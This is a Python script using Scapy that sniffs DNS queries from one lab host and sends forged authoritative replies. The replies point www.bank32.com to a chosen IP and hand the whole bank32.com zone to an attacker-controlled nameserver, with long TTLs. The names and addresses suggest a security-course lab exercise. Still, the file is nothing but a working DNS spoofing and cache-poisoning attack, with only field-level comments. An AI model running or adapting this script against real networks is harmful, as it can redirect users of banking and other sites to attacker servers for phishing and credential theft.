#!/usr/bin/python3
from scapy.all import *
TARGET_DOMAIN = "www.bank32.com." #target domain
SPOOFED_IP = "8.8.8.8" #ip we want to redirect to
FAKE_NS = "attacker32.com."  # Fake authoritative nameserver
def dns_spoof(pkt):
    #DNS question for our target domain
    #pkt[DNS].qd.qname = b"www.bank32.com."
    #pkt[DNS].qr==0 for querry
    if (DNS in pkt and pkt[DNS].qr == 0 and pkt[DNS].qd.qname == bytes(TARGET_DOMAIN, 'utf-8')):
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
        # Answer section
        an_dns=DNSRR(
            rrname=pkt[DNS].qd.qname,#domain name
            type='A',#Address record(ipv4 matching)
            ttl=259200,# Time to live (secondes)
            rdata=SPOOFED_IP # Our spoofed IP address
        )
        #Authaurative section
        ns_dns=DNSRR(
            rrname="bank32.com.",  # The entire domain
            type='NS',            # This is a nameserver record
            ttl=259200,           # Long TTL for the authority record
            rdata=FAKE_NS       #Attacker-controlled nameserver
        )
        
        dns = DNS(
            id=pkt[DNS].id,#same id of transaction
            qr=1,# response
            aa=1,# Authoritative Answer(comes directly from it)
            # Recursion Desired(same because as he wants to console other servers if needed)
            rd=pkt[DNS].rd,
            ra=0,# Recursion Available(set=0 because Authoritative server we said)
            # question section -> number of questions
            # (answer section, authority section, additional section)->number of records
            qdcount=1, ancount=1, nscount=1, arcount=0,
            qd=pkt[DNS].qd,# Question section (directly from the query)
            an = an_dns,
            ns = ns_dns
        )
        spoofed_pkt = ip/udp/dns
        send(spoofed_pkt)
sniff(filter="udp and port 53 and src host 10.0.2.5", prn=dns_spoof)